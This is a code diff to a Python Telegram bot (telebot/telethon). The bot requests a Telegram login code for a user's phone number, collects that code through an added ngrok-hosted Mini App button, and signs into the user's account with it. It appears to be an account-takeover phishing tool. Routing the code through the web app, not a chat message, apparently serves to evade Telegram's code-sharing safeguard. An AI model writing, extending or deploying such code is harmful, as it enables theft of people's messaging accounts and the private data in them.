@@ -1,3 +1,4 @@
+import json
 import asyncio
 from django.conf import settings
 from telebot import TeleBot
@@ -7,6 +8,7 @@ from telebot.types import (
     KeyboardButton,
     InlineKeyboardButton,
     InlineKeyboardMarkup,
+    WebAppInfo
 )
 from telethon import utils
 from telethon.sync import TelegramClient
@@ -20,6 +22,8 @@ import logging
 
 # logger = telebot.logger
 # telebot.logger.setLevel(logging.INFO)
+
+URL = "https://porpoise-knowing-eel.ngrok-free.app"
 
 bot = TeleBot(settings.TELEGRAM_BOT_TOKEN)
 
@@ -80,21 +84,32 @@ def process_phone_step(message: Message):
     }
     # user_auth_data[phone] = result.phone_code_hash
 
-    logging.warning(result)
-    logging.warning(result.phone_code_hash)
+    # logging.warning(result)
+    # logging.warning(result.phone_code_hash)
 
     # me = client.get_me()
     # logging.warning(me)
 
     client.disconnect()
+
+    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    button = KeyboardButton("Open Mini App", web_app=WebAppInfo(url=URL))
+    markup.add(button)
+
     
-    msg = bot.reply_to(message, "Iltimos raqamingizga yuborilgal kodni kiriting:")
+    msg = bot.reply_to(
+        message,
+        "Iltimos raqamingizga yuborilgal kodni kiriting:",
+        reply_markup=markup
+    )
     bot.register_next_step_handler(msg, process_verify_code_step)
 
 
 def process_verify_code_step(message: Message):
-    logging.warning('message')
-    logging.warning(message.text)
+    if not message.web_app_data: return
+    data = json.loads(message.web_app_data.data)
+
+    verify_code = data['code']
 
     try:
         asyncio.get_running_loop()
@@ -115,14 +130,14 @@ def process_verify_code_step(message: Message):
     me = None
 
     client._phone_code_hash = {parsed_phone: auth['phone_hash']}
-    logging.warning(client._phone_code_hash)
 
     try:
-        me = client.sign_in(phone=phone, code=message.text)
+        me = client.sign_in(phone=phone, code=verify_code)
     except Exception as e:
         logging.error(e)
         bot.reply_to(message, "Kutilmagan hatolik yuz berdi. Iltimos qayta urinib ko'ring.")
         return
+
     logging.warning(me)
 
     client.disconnect()
